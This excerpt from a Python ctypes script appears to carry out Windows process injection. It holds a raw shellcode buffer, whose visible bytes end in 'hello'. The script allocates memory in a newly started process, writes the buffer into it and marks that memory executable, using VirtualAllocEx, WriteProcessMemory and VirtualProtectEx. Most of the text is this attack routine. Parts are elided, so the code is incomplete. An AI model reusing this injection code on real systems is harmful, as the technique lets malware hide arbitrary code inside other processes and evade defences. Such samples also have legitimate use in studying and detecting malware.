...
class _SECURITY_ATTRIBUTES(Structure):
    _fields_=[('nLenght', wintypes.DWORD),
              ('nlSecurityDescriptor', wintypes.LPVOID),
...
PROCESS_ALL_ACCESS = (0x000F0000|0x0010000|0x00000FFF)
...
#print("Starting process wioth PID => {}".format(process.pid))
...
buf += b"\x85\x02\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
buf += b"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
buf += b"\x56\xff\xd5\x61\x61\x61\x00\x68\x65\x6c\x6c\x6f"
buf += b"\x00"
...
print("Started  => Handle:{}, PID:{}, TID:{}".format(h_process, pid, thread_id))

remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE )
verify(remote_memory)
print("Mem allocated => {}", hex(remote_memory))

write = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("Written => {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20
old_protect = wintypes.DWORD(0)

protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_protect))
verify(protect)
print("Mem protect updated from {} to {}". format(old_protect.value, PAGE_EXECUTE_READ))
